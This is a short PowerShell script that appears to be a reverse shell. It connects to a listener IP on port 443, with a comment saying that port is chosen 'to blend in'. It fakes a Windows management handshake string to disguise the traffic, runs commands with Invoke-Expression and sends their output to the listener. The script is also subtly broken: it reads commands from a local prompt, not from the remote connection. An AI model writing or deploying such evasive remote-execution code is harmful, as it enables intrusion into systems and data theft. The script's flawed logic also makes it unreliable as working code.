# Configuration
$TargetIP = "10.211.55.5"   # Replace with your listener IP
$TargetPort = 443           # Use a standard port to blend in (e.g., HTTPS)

# Create the TCP connection using native .NET classes
$TcpClient = New-Object System.Net.Sockets.TcpClient($TargetIP, $TargetPort)
$Stream = $TcpClient.GetStream()
$Writer = New-Object System.IO.StreamWriter($Stream, $false)
$Reader = New-Object System.IO.StreamReader($Stream)

# Establish the connection (WMI handshake simulation)
$Writer.WriteLine("Microsoft-Windows-Management-Interface/1.0")
$Writer.Flush()

# Receive initial response
$Response = $Reader.ReadLine()

if ($Response -eq "Microsoft-Windows-Management-Interface/1.0") {
    # Connection established, now execute commands
    while ($true) {
        try {
            $Command = Read-Host "Enter command (type 'exit' to quit)"
            
            if ($Command -eq "exit") { break }

            # Execute the command using native PowerShell execution
            $Output = Invoke-Expression $Command
            
            # Send output back to the listener
            $Writer.WriteLine($Output)
            $Writer.Flush()
        } catch {
            $Writer.WriteLine($_.Exception.Message)
            $Writer.Flush()
        }
    }
} else {
    Write-Host "Connection failed or handshake mismatch."
}

# Cleanup
$TcpClient.Close()
